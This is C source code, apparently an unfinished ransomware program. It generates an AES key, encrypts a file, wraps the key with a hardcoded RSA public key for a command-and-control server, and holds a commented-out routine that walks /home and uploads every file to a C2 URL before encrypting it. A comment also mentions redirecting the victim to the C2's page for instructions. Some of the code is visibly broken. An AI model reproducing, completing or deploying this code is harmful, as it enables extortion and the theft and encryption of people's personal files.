#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/aes.h>


#include <openssl/rand.h>

#include <openssl/err.h>

#include "files.h"
#include "encryption.h"

#define RSA_KEY_SIZE 4096

void sendFileToApi(const char *path, const char *api);



int main(){

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Generate AES key and IV
    unsigned char key[32];
    RAND_bytes(key, sizeof(key));

    unsigned char iv[16];
    RAND_bytes(iv, sizeof(iv));

    //Authentication string
    static const unsigned char aad[] = "Cyan";

    //Encrypt the specified file
    encrypt_file(key, iv, aad, "atom.png");

    //Decrypt the specified file
    decryptFile(key, iv, aad, "atom.png.cha");


    //Encrypt the AES key with the RSA public key
    const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\n"
                                 "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\n"
                                 "K1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\n"
                                 "ezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\n"
                                 "vPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\n"
                                 "nzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\n"
                                 "AABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\n"
                                 "xyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\n"
                                 "rrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\n"
                                 "VOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n"
                                 "1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\n"
                                 " KU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\n"
                                 " F07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n"
                                 "-----END PUBLIC KEY-----";
    const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key);
    const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv);


    //Send the encrypted AES key and iv to C2

    //List all the files we want to borrow ;)
    /*
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Send the raw file to C2
        sendFileToApi(pathList.paths[i], "https://192.168.0.1/path/to/file/api");

        //Encrypt each file with AES
        //encryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);
    */


    //Redirect to C2's web page for instructions

    return 0;
}
//WIP
void sendFileToApi(const char *path, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    curl_off_t speed_upload, total_time;
    FILE *fd;

    fd = fopen("debugit", "rb"); /* open file to upload */
    if(!fd)
        //Woops

        /* to get the file size */
        if(fstat(fileno(fd), &file_info) != 0)
            //Woops

            curl = curl_easy_init();
    if(curl){
        /* upload to this place */
        curl_easy_setopt(curl, CURLOPT_URL,
                         api);

        /* tell it to "upload" to the URL */
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* set where to read from (on Windows you need to use READFUNCTION too) */
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            //Woops
        }

        curl_easy_cleanup(curl);
    }
    fclose(fd);

}
